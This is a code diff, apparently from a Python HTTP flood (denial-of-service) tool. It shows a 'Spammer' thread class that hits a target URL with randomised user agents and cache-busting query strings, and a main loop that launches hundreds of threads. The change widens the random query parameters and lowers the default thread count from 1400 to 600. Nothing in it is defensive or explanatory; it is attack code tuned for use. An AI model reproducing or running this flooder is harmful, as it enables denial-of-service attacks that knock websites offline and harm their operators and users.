@@ -8219,7 +8219,7 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0,9999)) + "=" + str(random.randint(0,9999))
+        self.url = url + "?" + str(random.randint(0,99999999)) + "=" + str(random.randint(0,99999999))
         self.num = number
         self.headers = self.headers = {
                 'User-Agent': random.choice(ua),
@@ -8316,9 +8316,9 @@ class MainLoop():
                 print ('Error to read file.')
         while True:                
             try:
-                num_threads = int(input('> Enter the number of thread [1400]: '))
+                num_threads = int(input('> Enter the number of thread [600]: '))
             except:
-                num_threads = 1400
+                num_threads = 600
             break
 
         for i in range(num_threads):
